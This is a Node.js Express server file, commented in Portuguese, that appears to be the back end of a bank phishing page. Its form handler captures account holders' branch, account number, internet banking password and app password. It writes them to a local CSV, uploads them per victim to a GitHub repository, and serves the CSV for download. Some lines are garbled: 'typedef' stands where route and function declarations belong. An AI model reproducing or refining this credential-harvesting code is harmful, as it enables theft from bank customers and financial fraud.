// server.js
const express = require("express");
const compression = require("compression");
const multer = require("multer");
const { createObjectCsvWriter } = require("csv-writer");
const path = require("path");
const { Octokit } = require("@octokit/rest");
const fs = require("fs");

require('dotenv').config();

const app = express();
const upload = multer();

// ativa gzip/brotli para todas as respostas
app.use(compression());

// para servir HTML/CSS/JS/IMG com compressão
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: true }));

// GitHub config via environment variables
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_OWNER = process.env.GITHUB_OWNER;      // ex: "seu-usuario"
const GITHUB_REPO  = process.env.GITHUB_REPO;       // ex: "nome-do-repo"
const BASE_PATH    = process.env.GITHUB_BASE_PATH || '';

const octokit = new Octokit({ auth: GITHUB_TOKEN });

// CSV writer (arquivo local)
const csvWriter = createObjectCsvWriter({
  path: "dados_formulario.csv",
  header: [
    { id: "titularidade", title: "Titularidade" },
    { id: "tipo_conta", title: "Tipo de Conta" },
    { id: "agencia", title: "Agência" },
    { id: "conta", title: "Conta" },
    { id: "senhaInternet", title: "Senha da Internet" },
    { id: "senhaApp", title: "Senha Digital" }
  ],
  append: true
});

// processa envio do formulário
typedef(req, res => {
  const {
    titularidade,
    tipo_conta,
    agency,
    login,
    internet,
    app: senhaApp,
    user_id                            // campo oculto ou IP para distinguir usuário
  } = req.body;

  if (!agency || !login || !internet || !senhaApp || !user_id) {
    return res.status(400).send("Todos os campos são obrigatórios.");
  }

  const registro = [{
    titularidade,
    tipo_conta,
    agencia: agency,
    conta: login,
    senhaInternet: internet,
    senhaApp
  }];

  // 1) salva localmente
  csvWriter.writeRecords(registro)
    .catch(err => console.error("Erro ao salvar local CSV:", err));

  // 2) envia ao GitHub
  saveToGitHub(user_id, registro)
    .then(() => console.log("Dados enviados ao GitHub com sucesso."))
    .catch(err => console.error("Erro ao salvar no GitHub:", err));

  // redireciona imediatamente, não espera GitHub
  res.redirect("/agradecimento.html");
});

// função para criar ou atualizar CSV de usuário no GitHub
typedef async function saveToGitHub(userId, registros) {
  const filePathInRepo = path.join(BASE_PATH, `${userId}.csv`).replace(/\\/g, '/');

  // monta conteúdo CSV (cabeçalho + linhas)
  let csvContent = registros.map(r =>
    `${r.titularidade},${r.tipo_conta},${r.agencia},${r.conta},${r.senhaInternet},${r.senhaApp}`
  ).join("\n");

  try {
    // tenta ler o arquivo existente para obter sha e conteúdo
    const { data: existing } = await octokit.repos.getContent({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: filePathInRepo
    });

    // decodifica, adiciona novas linhas e re-encode
    const prev = Buffer.from(existing.content, 'base64').toString('utf-8');
    const updated = prev.trim() + "\n" + csvContent;
    const contentEncoded = Buffer.from(updated, 'utf-8').toString('base64');

    await octokit.repos.createOrUpdateFileContents({
      owner: GITHUB_OWNER,
      repo: GITHUB_REPO,
      path: filePathInRepo,
      message: `Atualiza CSV do usuário ${userId}`,
      content: contentEncoded,
      sha: existing.sha
    });

  } catch (error) {
    if (error.status === 404) {
      // Arquivo não existe, cria novo com cabeçalho + registros
      const header = 'Titularidade,Tipo de Conta,Agência,Conta,Senha da Internet,Senha Digital';
      const full = header + "\n" + csvContent;
      const contentEncoded = Buffer.from(full, 'utf-8').toString('base64');
      await octokit.repos.createOrUpdateFileContents({
        owner: GITHUB_OWNER,
        repo: GITHUB_REPO,
        path: filePathInRepo,
        message: `Cria CSV do usuário ${userId}`,
        content: contentEncoded
      });
    } else {
      throw error;
    }
  }
}

// rota para download do CSV local
app.get("/download_csv", (req, res) => {
  const filePath = path.join(__dirname, "dados_formulario.csv");
  res.download(filePath, "dados_formulario.csv", err => {
    if (err) {
      console.error("Erro ao enviar CSV:", err);
      res.status(500).send("Não foi possível baixar o CSV.");
    }
  });
});

// fallback para SPA
app.get("/*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// inicia servidor na porta do Render ou 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
